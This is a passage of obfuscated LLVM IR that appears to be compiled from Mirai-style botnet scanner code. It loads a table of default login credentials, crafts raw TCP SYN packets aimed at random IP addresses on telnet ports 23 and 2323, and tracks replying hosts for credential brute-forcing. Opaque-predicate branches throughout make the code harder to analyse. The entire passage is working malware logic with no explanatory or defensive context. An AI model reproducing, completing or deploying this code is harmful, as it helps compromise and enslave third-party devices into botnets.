  %162 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %161, i32 0, i32 1
  store i16 %160, i16* %162, align 2
  %163 = load i16, i16* %2, align 2
  %164 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %165 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %164, i32 0, i32 0
  store i16 %163, i16* %165, align 4
  %166 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %167 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %166, i32 0, i32 4
  %168 = load i16, i16* %167, align 4
  %169 = and i16 %168, -241
  %170 = or i16 %169, 80
  store i16 %170, i16* %167, align 4
  %171 = call i32 @rand_next()
  %172 = and i32 %171, 65535
  %173 = trunc i32 %172 to i16
  %174 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 5
  store i16 %173, i16* %175, align 2
  %176 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -513
  %180 = or i16 %179, 512
  store i16 %180, i16* %177, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 17)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.14, i32 0, i32 0), i16 zeroext 15)
  br label %181

; <label>:181:                                    ; preds = %originalBBpart2267, %135
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %182 = load i32, i32* @fake_time, align 4
  %183 = load i32, i32* %10, align 4
  %184 = icmp ne i32 %182, %183
  br i1 %184, label %185, label %290

; <label>:185:                                    ; preds = %181
  %186 = load i32, i32* @fake_time, align 4
  store i32 %186, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %187

; <label>:187:                                    ; preds = %270, %185
  %188 = load i32, i32* %1, align 4
  %189 = icmp slt i32 %188, 384
  br i1 %189, label %190, label %273

; <label>:190:                                    ; preds = %187
  %191 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %191, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %192 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i64 1
  %194 = bitcast %struct.iphdr* %193 to %struct.tcphdr*
  store %struct.tcphdr* %194, %struct.tcphdr** %16, align 8
  %195 = call i32 @rand_next()
  %196 = trunc i32 %195 to i16
  %197 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 3
  store i16 %196, i16* %198, align 4
  %199 = load i32, i32* @LOCAL_ADDR, align 4
  %200 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 8
  store i32 %199, i32* %201, align 4
  %202 = call i32 @get_random_ip()
  %203 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 9
  store i32 %202, i32* %204, align 4
  %205 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 7
  store i16 0, i16* %206, align 2
  %207 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %208 = bitcast %struct.iphdr* %207 to i16*
  %209 = call zeroext i16 @checksum_generic(i16* %208, i32 20)
  %210 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 7
  store i16 %209, i16* %211, align 2
  %212 = load i32, i32* %1, align 4
  %213 = srem i32 %212, 10
  %214 = icmp eq i32 %213, 0
  br i1 %214, label %215, label %219

; <label>:215:                                    ; preds = %190
  %216 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %217 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 1
  store i16 %216, i16* %218, align 2
  br label %223

; <label>:219:                                    ; preds = %190
  %220 = call zeroext i16 @htons(i16 zeroext 23) #7
  %221 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %222 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %221, i32 0, i32 1
  store i16 %220, i16* %222, align 2
  br label %223

; <label>:223:                                    ; preds = %219, %215
  %224 = load i32, i32* @x.53
  %225 = load i32, i32* @y.54
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %223
  %232 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 9
  %234 = load i32, i32* %233, align 4
  %235 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 2
  store i32 %234, i32* %236, align 4
  %237 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %238 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %237, i32 0, i32 6
  store i16 0, i16* %238, align 4
  %239 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %240 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %241 = bitcast %struct.tcphdr* %240 to i8*
  %242 = call zeroext i16 @htons(i16 zeroext 20) #7
  %243 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %239, i8* %241, i16 zeroext %242, i32 20)
  %244 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 6
  store i16 %243, i16* %245, align 4
  %246 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %246, align 4
  %247 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 9
  %249 = load i32, i32* %248, align 4
  %250 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %251 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %250, i32 0, i32 0
  store i32 %249, i32* %251, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 1
  %254 = load i16, i16* %253, align 2
  %255 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %254, i16* %255, align 2
  %256 = load i32, i32* @rsck, align 4
  %257 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %258 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %258, %struct.sockaddr** %257, align 8
  %259 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %260 = load %struct.sockaddr*, %struct.sockaddr** %259, align 8
  %261 = call i64 @sendto(i32 %256, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %260, i32 16)
  %262 = load i32, i32* @x.53
  %263 = load i32, i32* @y.54
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %270

; <label>:270:                                    ; preds = %originalBBpart212
  %271 = load i32, i32* %1, align 4
  %272 = add nsw i32 %271, 1
  store i32 %272, i32* %1, align 4
  br label %187

; <label>:273:                                    ; preds = %187
  %274 = load i32, i32* @x.53
  %275 = load i32, i32* @y.54
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %273
  %282 = load i32, i32* @x.53
  %283 = load i32, i32* @y.54
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %290

; <label>:290:                                    ; preds = %originalBBpart216, %181
  %291 = load i32, i32* @x.53
  %292 = load i32, i32* @y.54
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %290
  store i32 0, i32* %9, align 4
  %299 = load i32, i32* @x.53
  %300 = load i32, i32* @y.54
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %307

; <label>:307:                                    ; preds = %624, %564, %536, %originalBBpart263, %472, %464, %456, %431, %398, %391, %368, %originalBBpart220
  %308 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %309 = bitcast i8* %308 to %struct.iphdr*
  store %struct.iphdr* %309, %struct.iphdr** %20, align 8
  %310 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %311 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %310, i64 1
  %312 = bitcast %struct.iphdr* %311 to %struct.tcphdr*
  store %struct.tcphdr* %312, %struct.tcphdr** %21, align 8
  %313 = call i32* @__errno_location() #7
  store i32 0, i32* %313, align 4
  %314 = load i32, i32* @rsck, align 4
  %315 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %316 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %316, align 8
  %317 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %318 = load %struct.sockaddr*, %struct.sockaddr** %317, align 8
  %319 = call i64 @recvfrom(i32 %314, i8* %315, i64 1514, i32 16384, %struct.sockaddr* %318, i32* null)
  %320 = trunc i64 %319 to i32
  store i32 %320, i32* %18, align 4
  %321 = load i32, i32* %18, align 4
  %322 = icmp sle i32 %321, 0
  br i1 %322, label %347, label %323

; <label>:323:                                    ; preds = %307
  %324 = load i32, i32* @x.53
  %325 = load i32, i32* @y.54
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %323
  %332 = call i32* @__errno_location() #7
  %333 = load i32, i32* %332, align 4
  %334 = icmp eq i32 %333, 11
  %335 = load i32, i32* @x.53
  %336 = load i32, i32* @y.54
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %334, label %347, label %343

; <label>:343:                                    ; preds = %originalBBpart224
  %344 = call i32* @__errno_location() #7
  %345 = load i32, i32* %344, align 4
  %346 = icmp eq i32 %345, 11
  br i1 %346, label %347, label %364

; <label>:347:                                    ; preds = %343, %originalBBpart224, %307
  %348 = load i32, i32* @x.53
  %349 = load i32, i32* @y.54
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %347
  %356 = load i32, i32* @x.53
  %357 = load i32, i32* @y.54
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %636

; <label>:364:                                    ; preds = %343
  %365 = load i32, i32* %18, align 4
  %366 = sext i32 %365 to i64
  %367 = icmp ult i64 %366, 40
  br i1 %367, label %368, label %369

; <label>:368:                                    ; preds = %364
  br label %307

; <label>:369:                                    ; preds = %364
  %370 = load i32, i32* @x.53
  %371 = load i32, i32* @y.54
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %369
  %378 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %379 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %378, i32 0, i32 9
  %380 = load i32, i32* %379, align 4
  %381 = load i32, i32* @LOCAL_ADDR, align 4
  %382 = icmp ne i32 %380, %381
  %383 = load i32, i32* @x.53
  %384 = load i32, i32* @y.54
  %385 = sub i32 %383, 1
  %386 = mul i32 %383, %385
  %387 = urem i32 %386, 2
  %388 = icmp eq i32 %387, 0
  %389 = icmp slt i32 %384, 10
  %390 = or i1 %388, %389
  br i1 %390, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %382, label %391, label %392

; <label>:391:                                    ; preds = %originalBBpart232
  br label %307

; <label>:392:                                    ; preds = %originalBBpart232
  %393 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %394 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %393, i32 0, i32 6
  %395 = load i8, i8* %394, align 1
  %396 = zext i8 %395 to i32
  %397 = icmp ne i32 %396, 6
  br i1 %397, label %398, label %399

; <label>:398:                                    ; preds = %392
  br label %307

; <label>:399:                                    ; preds = %392
  %400 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %401 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %400, i32 0, i32 0
  %402 = load i16, i16* %401, align 4
  %403 = zext i16 %402 to i32
  %404 = call zeroext i16 @htons(i16 zeroext 23) #7
  %405 = zext i16 %404 to i32
  %406 = icmp ne i32 %403, %405
  br i1 %406, label %407, label %432

; <label>:407:                                    ; preds = %399
  %408 = load i32, i32* @x.53
  %409 = load i32, i32* @y.54
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %407
  %416 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 0
  %418 = load i16, i16* %417, align 4
  %419 = zext i16 %418 to i32
  %420 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %421 = zext i16 %420 to i32
  %422 = icmp ne i32 %419, %421
  %423 = load i32, i32* @x.53
  %424 = load i32, i32* @y.54
  %425 = sub i32 %423, 1
  %426 = mul i32 %423, %425
  %427 = urem i32 %426, 2
  %428 = icmp eq i32 %427, 0
  %429 = icmp slt i32 %424, 10
  %430 = or i1 %428, %429
  br i1 %430, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %422, label %431, label %432

; <label>:431:                                    ; preds = %originalBBpart236
  br label %307

; <label>:432:                                    ; preds = %originalBBpart236, %399
  %433 = load i32, i32* @x.53
  %434 = load i32, i32* @y.54
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %432
  %441 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %442 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %441, i32 0, i32 1
  %443 = load i16, i16* %442, align 2
  %444 = zext i16 %443 to i32
  %445 = load i16, i16* %2, align 2
  %446 = zext i16 %445 to i32
  %447 = icmp ne i32 %444, %446
  %448 = load i32, i32* @x.53
  %449 = load i32, i32* @y.54
  %450 = sub i32 %448, 1
  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %447, label %456, label %457

; <label>:456:                                    ; preds = %originalBBpart240
  br label %307

; <label>:457:                                    ; preds = %originalBBpart240
  %458 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %459 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %458, i32 0, i32 4
  %460 = load i16, i16* %459, align 4
  %461 = lshr i16 %460, 9
  %462 = and i16 %461, 1
  %463 = icmp ne i16 %462, 0
  br i1 %463, label %465, label %464

; <label>:464:                                    ; preds = %457
  br label %307

; <label>:465:                                    ; preds = %457
  %466 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %467 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %466, i32 0, i32 4
  %468 = load i16, i16* %467, align 4
  %469 = lshr i16 %468, 12
  %470 = and i16 %469, 1
  %471 = icmp ne i16 %470, 0
  br i1 %471, label %473, label %472

; <label>:472:                                    ; preds = %465
  br label %307

; <label>:473:                                    ; preds = %465
  %474 = load i32, i32* @x.53
  %475 = load i32, i32* @y.54
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %473
  %482 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %483 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %482, i32 0, i32 4
  %484 = load i16, i16* %483, align 4
  %485 = lshr i16 %484, 10
  %486 = and i16 %485, 1
  %487 = icmp ne i16 %486, 0
  %488 = load i32, i32* @x.53
  %489 = load i32, i32* @y.54
  %490 = sub i32 %488, 1
  %491 = mul i32 %488, %490
  %492 = urem i32 %491, 2
  %493 = icmp eq i32 %492, 0
  %494 = icmp slt i32 %489, 10
  %495 = or i1 %493, %494
  br i1 %495, label %originalBBpart259, label %originalBB42alteredBB

originalBBpart259:                                ; preds = %originalBB42
  br i1 %487, label %496, label %513

; <label>:496:                                    ; preds = %originalBBpart259
  %497 = load i32, i32* @x.53
  %498 = load i32, i32* @y.54
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %496
  %505 = load i32, i32* @x.53
  %506 = load i32, i32* @y.54
  %507 = sub i32 %505, 1
  %508 = mul i32 %505, %507
  %509 = urem i32 %508, 2
  %510 = icmp eq i32 %509, 0
  %511 = icmp slt i32 %506, 10
  %512 = or i1 %510, %511
  br i1 %512, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %307

; <label>:513:                                    ; preds = %originalBBpart259
  %514 = load i32, i32* @x.53
  %515 = load i32, i32* @y.54
  %516 = sub i32 %514, 1
  %517 = mul i32 %514, %516
  %518 = urem i32 %517, 2
  %519 = icmp eq i32 %518, 0
  %520 = icmp slt i32 %515, 10
  %521 = or i1 %519, %520
  br i1 %521, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %513
  %522 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 4
  %524 = load i16, i16* %523, align 4
  %525 = lshr i16 %524, 8
  %526 = and i16 %525, 1
  %527 = icmp ne i16 %526, 0
  %528 = load i32, i32* @x.53
  %529 = load i32, i32* @y.54
  %530 = sub i32 %528, 1
  %531 = mul i32 %528, %530
  %532 = urem i32 %531, 2
  %533 = icmp eq i32 %532, 0
  %534 = icmp slt i32 %529, 10
  %535 = or i1 %533, %534
  br i1 %535, label %originalBBpart290, label %originalBB65alteredBB

originalBBpart290:                                ; preds = %originalBB65
  br i1 %527, label %536, label %537

; <label>:536:                                    ; preds = %originalBBpart290
  br label %307

; <label>:537:                                    ; preds = %originalBBpart290
  %538 = load i32, i32* @x.53
  %539 = load i32, i32* @y.54
  %540 = sub i32 %538, 1
  %541 = mul i32 %538, %540
  %542 = urem i32 %541, 2
  %543 = icmp eq i32 %542, 0
  %544 = icmp slt i32 %539, 10
  %545 = or i1 %543, %544
  br i1 %545, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %537
  %546 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %547 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %546, i32 0, i32 3
  %548 = load i32, i32* %547, align 4
  %549 = call i32 @ntohl(i32 %548) #7
  %550 = sub i32 %549, 1
  %551 = call i32 @htonl(i32 %550) #7
  %552 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %553 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %552, i32 0, i32 8
  %554 = load i32, i32* %553, align 4
  %555 = icmp ne i32 %551, %554
  %556 = load i32, i32* @x.53
  %557 = load i32, i32* @y.54
  %558 = sub i32 %556, 1
  %559 = mul i32 %556, %558
  %560 = urem i32 %559, 2
  %561 = icmp eq i32 %560, 0
  %562 = icmp slt i32 %557, 10
  %563 = or i1 %561, %562
  br i1 %563, label %originalBBpart2107, label %originalBB92alteredBB

originalBBpart2107:                               ; preds = %originalBB92
  br i1 %555, label %564, label %565

; <label>:564:                                    ; preds = %originalBBpart2107
  br label %307

; <label>:565:                                    ; preds = %originalBBpart2107
  store %struct.scanner_connection* null, %struct.scanner_connection** %22, align 8
  %566 = load i32, i32* %9, align 4
  store i32 %566, i32* %18, align 4
  br label %567

; <label>:567:                                    ; preds = %originalBBpart2122, %565
  %568 = load i32, i32* %18, align 4
  %569 = icmp slt i32 %568, 256
  br i1 %569, label %570, label %620

; <label>:570:                                    ; preds = %567
  %571 = load i32, i32* @x.53
  %572 = load i32, i32* @y.54
  %573 = sub i32 %571, 1
  %574 = mul i32 %571, %573
  %575 = urem i32 %574, 2
  %576 = icmp eq i32 %575, 0
  %577 = icmp slt i32 %572, 10
  %578 = or i1 %576, %577
  br i1 %578, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %570
  %579 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %580 = load i32, i32* %18, align 4
  %581 = sext i32 %580 to i64
  %582 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %579, i64 %581
  %583 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %582, i32 0, i32 3
  %584 = load i32, i32* %583, align 8
  %585 = icmp eq i32 %584, 0
  %586 = load i32, i32* @x.53
  %587 = load i32, i32* @y.54
  %588 = sub i32 %586, 1
  %589 = mul i32 %586, %588
  %590 = urem i32 %589, 2
  %591 = icmp eq i32 %590, 0
  %592 = icmp slt i32 %587, 10
  %593 = or i1 %591, %592
  br i1 %593, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br i1 %585, label %594, label %600

; <label>:594:                                    ; preds = %originalBBpart2111
  %595 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %596 = load i32, i32* %18, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %595, i64 %597
  store %struct.scanner_connection* %598, %struct.scanner_connection** %22, align 8
  %599 = load i32, i32* %18, align 4
  store i32 %599, i32* %9, align 4
  br label %620

; <label>:600:                                    ; preds = %originalBBpart2111
  br label %601

; <label>:601:                                    ; preds = %600
  %602 = load i32, i32* @x.53
  %603 = load i32, i32* @y.54
  %604 = sub i32 %602, 1
  %605 = mul i32 %602, %604
  %606 = urem i32 %605, 2
  %607 = icmp eq i32 %606, 0
  %608 = icmp slt i32 %603, 10
  %609 = or i1 %607, %608
  br i1 %609, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %601
  %610 = load i32, i32* %18, align 4
  %611 = add nsw i32 %610, 1
  store i32 %611, i32* %18, align 4
  %612 = load i32, i32* @x.53
  %613 = load i32, i32* @y.54
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBBpart2122, label %originalBB113alteredBB

